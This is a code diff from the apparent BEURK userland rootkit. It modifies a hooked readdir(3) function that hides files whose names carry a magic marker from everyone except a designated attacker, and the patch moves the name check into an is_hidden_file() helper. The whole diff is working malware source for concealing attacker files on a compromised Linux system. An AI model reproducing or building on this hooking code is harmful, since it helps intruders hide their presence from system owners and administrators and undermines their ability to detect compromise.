@@ -18,9 +18,10 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include "beurk.h"
-#include "config.h"
-#include "hooks.h"
+#include <dirent.h> /* struct dirent, DIR */
+#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_READDIR() */
+#include "hooks.h" /* prototype */
 
 struct dirent   *readdir(DIR *dirp) {
     DEBUG(D_INFO, "call readdir(3) hooked");
@@ -32,7 +33,7 @@ struct dirent   *readdir(DIR *dirp) {
     if (is_attacker())
         return (dir);
 
-    while (dir && strstr(dir->d_name, MAGIC_STRING)) {
+    while (dir && is_hidden_file(dir->d_name)) {
         dir = REAL_READDIR(dirp);
     }
     return (dir);
